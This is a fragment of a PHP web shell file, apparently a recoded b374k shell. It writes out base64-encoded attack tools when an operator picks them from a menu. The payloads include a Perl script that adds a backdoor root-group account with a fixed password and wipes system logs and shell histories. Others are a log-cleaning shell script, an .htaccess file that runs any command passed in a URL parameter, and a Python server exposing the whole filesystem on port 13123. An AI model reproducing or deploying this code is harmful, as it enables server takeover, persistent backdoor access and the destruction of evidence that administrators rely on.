Iik7DQpzeXN0ZW0oInJtIDUiKTsNCnN5c3RlbSgicm0gNTAiKTsNCnN5c3RlbSgicm0gNTQiKTsNCnN5c3RlbSgicm0gNiIpOw0Kc3lzdGVtKCJybSA2NyIpOw0Kc3lzdGVtKCJybSA3Iik7DQpzeXN0ZW0oInJtIDctMiIpOw0Kc3lzdGVtKCJybSA3eCIpOw0Kc3lzdGVtKCJybSA4Iik7DQpzeXN0ZW0oInJtIDkiKTsNCnN5c3RlbSgicm0gOTAiKTsNCnN5c3RlbSgicm0gOTQiKTsNCnN5c3RlbSgicm0gTGludXhfMi42KDEpLjEyIik7DQpzeXN0ZW0oInJtIExpbnV4XzIuNi4xMiIpOw0Kc3lzdGVtKCJybSBMaW51eF8yLjYuOS1qb29seXNoaXQiKTsNCnN5c3RlbSgicm0gYWNpZCIpOw0Kc3lzdGVtKCJybSBkM3ZpbCIpOw0Kc3lzdGVtKCJybSBleHAxIik7DQpzeXN0ZW0oInJtIGV4cDIiKTsNCnN5c3RlbSgicm0gZXhwMyIpOw0Kc3lzdGVtKCJybSBleHBsb2l0Iik7DQpzeXN0ZW0oInJtIGZ1bGwtbmVsc29uIik7DQpzeXN0ZW0oInJtIGdheXJvcyIpOw0Kc3lzdGVtKCJybSBsZW5pcy5zaCIpOw0Kc3lzdGVtKCJybSBsb2NhbC0yLjYuOS0yMDA1LTIwMDYiKTsNCnN5c3RlbSgicm0gbG9jYWwtcm9vdC1leHBsb2l0LWdheXJvcyIpOw0Kc3lzdGVtKCJybSBwcml2NCIpOw0Kc3lzdGVtKCJybSBwd25rZXJuZWwiKTsNCnN5c3RlbSgicm0gcm9vdC5weSIpOw0Kc3lzdGVtKCJybSBydW54Iik7DQpzeXN0ZW0oInJtIHRpdm9saSIpOw0Kc3lzdGVtKCJybSB1YnVudHUiKTsNCnN5c3RlbSgicm0gdm1zcGxpY2UtbG9jYWwtcm9vdC1leHBsb2l0Iik7DQpzeXN0ZW0oInJtIHoxZC0yMDExIik7DQpwcmludCAiIz1bK109PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT1bK109I1xuIjsNCnByaW50ICJ8ICAgICAgICAgICAgIFRoYW5rcyBGb3IgVXNpbmcgaXQgICAgICAgICAgICAgICAgICB8XG4iOw0KcHJpbnQgInwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHxcbiI7DQpwcmludCAifCAgICAgICBKb2luIHVzIG9uIGh0dHA6Ly90aGVjcm93c2NyZXcub3JnICAgICAgICAgfFxuIjsNCnByaW50ICIjPVsrXT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PVsrXT0jXG4iOw0KDQp9DQppZiAoJEFSR1ZbMF0gPX4gImFkZCIgKSANCg0Kew0KcHJpbnQgIkFkZCBVc2VyIFJvb3QgOkRcbiI7DQpwcmludCAidXNlciA6IFsgZ2FiYnkgXVxuIjsNCnN5c3RlbSAiYWRkdXNlciAtZyAwIGdhYmJ5IC1HIHdoZWVsLHN5cyxiaW4sZGFlbW9uLGFkbSxkaXNrIC1kIC9zZjcgLXMgL2Jpbi9zaCI7DQpzeXN0ZW0gInBhc3N3ZCByMDB0MTIzIjsNCnByaW50ICJwYXNzIGlzIDogcjAwdDEyM1xuIjsgDQpwcmludCAiIz1bK109PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT1bK109I1xuIjsNCnByaW50ICJ8ICAgICAgICAgICAgIFRoYW5rcyBGb3IgVXNpbmcgaXQgICAgICAgICAgICAgICAgICB8XG4iOw0KcHJpbnQgInwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHxcbiI7DQpwcmludCAifCAgICAgICBKb2luIHVzIG9uIGh0dHA6Ly90aGVjcm93c2NyZXcub3JnICAgICAgICAgfFxuIjsNCnByaW50ICIjPVsrXT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PVsrXT0jXG4iOw0KDQp9DQppZiAoJEFSR1ZbMF0gPX4gInJtIiApIA0KDQp7DQpwcmludCAicm0gLXJmIExvZy4uLlxuIjsNCnN5c3RlbSAicm0gLXJmIC90bXAvbG9ncyI7DQpzeXN0ZW0gInJtIC1yZiAvcm9vdC8ua3NoX2hpc3RvcnkiOw0Kc3lzdGVtICJybSAtcmYgL3Jvb3QvLmJhc2hfaGlzdG9yeSI7DQpzeXN0ZW0gInJtIC1yZiAvcm9vdC8uYmFzaF9sb2dvdXQiOw0Kc3lzdGVtICJybSAtcmYgL3Vzci9sb2NhbC9hcGFjaGUvbG9ncyI7DQpzeXN0ZW0gInJtIC1yZiAvdXNyL2xvY2FsL2FwYWNoZS9sb2ciOw0Kc3lzdGVtICJybSAtcmYgL3Zhci9hcGFjaGUvbG9ncyI7DQpzeXN0ZW0gInJtIC1yZiAvdmFyL2FwYWNoZS9sb2ciOw0Kc3lzdGVtICJybSAtcmYgL3Zhci9ydW4vdXRtcCI7DQpzeXN0ZW0gInJtIC1yZiAvdmFyL2xvZ3MiOw0Kc3lzdGVtICJybSAtcmYgL3Zhci9sb2ciOw0Kc3lzdGVtICJybSAtcmYgL3Zhci9hZG0iOw0Kc3lzdGVtICJybSAtcmYgL2V0Yy93dG1wIjsNCnN5c3RlbSAicm0gLXJmIC9ldGMvdXRtcCI7DQpzeXN0ZW0gImNkIC9iaW4iOw0KcHJpbnQgIlx0TG9nIERlbGV0ZWQgTWFzIE1ibG8gOkQuLiBcblxuIjsNCnByaW50ICIjPVsrXT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PVsrXT0jXG4iOw0KcHJpbnQgInwgICAgICAgICAgICAgVGhhbmtzIEZvciBVc2luZyBpdCAgICAgICAgICAgICAgICAgIHxcbiI7DQpwcmludCAifCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfFxuIjsNCnByaW50ICJ8ICAgICAgIEpvaW4gdXMgb24gaHR0cDovL3RoZWNyb3dzY3Jldy5vcmcgICAgICAgICB8XG4iOw0KcHJpbnQgIiM9WytdPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09WytdPSNcbiI7DQoNCn0NCiMgQ29kZWQgQnkgR2FiYnkgLSBJbmRvbmVzaWEgRmVtYWxlIEhhY2tlciovIA0K";
		file_put_contents("r00t.pl",base64_decode($perlrot));
		echo "<script>alert('Perl Auto R00ting Created'); hideAll();</script>";
		die();
		}
		elseif ( $pilih == 'slc') {
		$slc ="IyEvYmluL3NoDQojIENvZGVkIEJ5IFJlZCBINHQgViFwZXIgKEJlbmlfVmFuZGEpDQojIEdyMzN0eiA6IEFsbCBNZW1iZXJzIE9mIElySXNUDQojIGNobW9kIDA3NTUgc2VydmVyTEMuc2ggPj4gLi9zZXJ2ZXJMQy5zaA0KDQplY2hvICJbKl0gR29pbmcgVE8gRGVsZXRlIExvZyBTZXJ2ZXJzIC4uLiAiDQpmaW5kIC8gLW5hbWUgKi5iYXNoX2hpc3RvcnkgLWV4ZWMgcm0gLXJmIHt9IFw7DQpmaW5kIC8gLW5hbWUgKi5iYXNoX2xvZ291dCAtZXhlYyBybSAtcmYge30gXDsNCmZpbmQgLyAtbmFtZSAibG9nKiIgLWV4ZWMgcm0gLXJmIHt9IFw7DQpmaW5kIC8gLW5hbWUgKi5sb2cgLWV4ZWMgcm0gLXJmIHt9IFw7DQpybSAtcmYgL3RtcC9sb2dzDQpybSAtcmYgJEhJU1RGSUxFDQpybSAtcmYgL3Jvb3QvLmtzaF9oaXN0b3J5DQpybSAtcmYgL3Jvb3QvLmJhc2hfaGlzdG9yeQ0Kcm0gLXJmIC9yb290Ly5rc2hfaGlzdG9yeQ0Kcm0gLXJmIC9yb290Ly5iYXNoX2xvZ291dA0Kcm0gLXJmIC91c3IvbG9jYWwvYXBhY2hlL2xvZ3MNCnJtIC1yZiAvdXNyL2xvY2FsL2FwYWNoZS9sb2cNCnJtIC1yZiAvdmFyL2FwYWNoZS9sb2dzDQpybSAtcmYgL3Zhci9hcGFjaGUvbG9nDQpybSAtcmYgL3Zhci9ydW4vdXRtcA0Kcm0gLXJmIC92YXIvbG9ncw0Kcm0gLXJmIC92YXIvbG9nDQpybSAtcmYgL3Zhci9hZG0NCnJtIC1yZiAvZXRjL3d0bXANCnJtIC1yZiAvZXRjL3V0bXANCg0KZWNobyAiWypdIERvbmUgLiBHb29kIEx1Y2sgOyki";
		file_put_contents("serverLC.sh",base64_decode($slc));
		echo "<script>alert('Server Log Cleaner [ serverLC.sh ] Created'); hideAll();</script>";
		die();
		}
		elseif ( $pilih == 'htasell') {
		$ht = 'PEZpbGVzIH4gIl5cLmh0Ij4NCk9yZGVyIGFsbG93LGRlbnkNCkFsbG93IGZyb20gYWxsDQo8L2ZpbGVzPg0KQWRkVHlwZSBhcHBsaWNhdGlvbi94LWh0dHBkLXBocCAuaHRhY2Nlc3MNCiMgPD9waHAgcGFzc3RocnUoJF9HRVRbJ2NtZCddKTs/Pg0K';
		file_put_contents(".htaccess",base64_decode($ht));
		echo "<script>alert('htaccess Shell [ .htaccess ] Created : open in site/.htaccess?cmd= '); hideAll();</script>";
		die();
		}
		elseif ( $pilih == 'port') {
		$openport = 'IyEvdXNyYmluL2VudiBweXRob24NCiMgZGV2aWx6YzBkZS5vcmcgKGMpIDIwMTINCiMgcmVjb2RlZCBieSB4JzFuNzNjdCAoYykgMjAxMw0KDQppbXBvcnQgU2ltcGxlSFRUUFNlcnZlcg0KaW1wb3J0IFNvY2tldFNlcnZlcg0KaW1wb3J0IG9zDQoNCnBvcnQgPSAxMzEyMw0KDQppZl9fbmFtZV9fPT0nX19tYWluX18nOg0KCW9zLmNoZGlyKCcvJykNCglIYW5kbGVyID0gU2ltcGxlSFRUUFNlcnZlci5TaW1wbGVIVFRQUmVxdWVzdEhhbmRsZXINCglodHRwZCA9IFNvY2tldFNlcnZlci5UQ1BTZXJ2ZXIoKCIiLHBvcnQpLCBIYW5kbGVyKQ0KCQ0KCXByaW50KCJOb3cgb3BlbiB0aGlzIHNlcnZlciBvbiB3ZWIgYnJvd3NlciBhdCBwb3J0OiAiICsgc3RyKHBvcnQpKQ0KCXByaW50KCJleGFtcGxlOiBodHRwOi8vd3d3LmZiaS5nb3Y6IiArIHN0cihwb3J0KSkNCglodHRwLnNlcnZlX2ZvcmV2ZXIoKQ==';
		file_put_contents("port.py",base64_decode($openport));
		chmod("port.py",0755);
		echo "<script>alert('Python Open Port 13123 [ port.py ] Created'); hideAll();</script>";
		die();
		}
	}
	
?><center><br><br><div class="info">-=[ b374k r3c0ded by <b>X'1N73CT & S1T1 B4RC0D3</b> ]=-</div><br>
<div class="jaya">&copy; <?php echo date('Y',time()); ?> X'1N73CT & S1T1 B4RC0D3</div></center><br><br>
</script>
</div>
</body>
</html>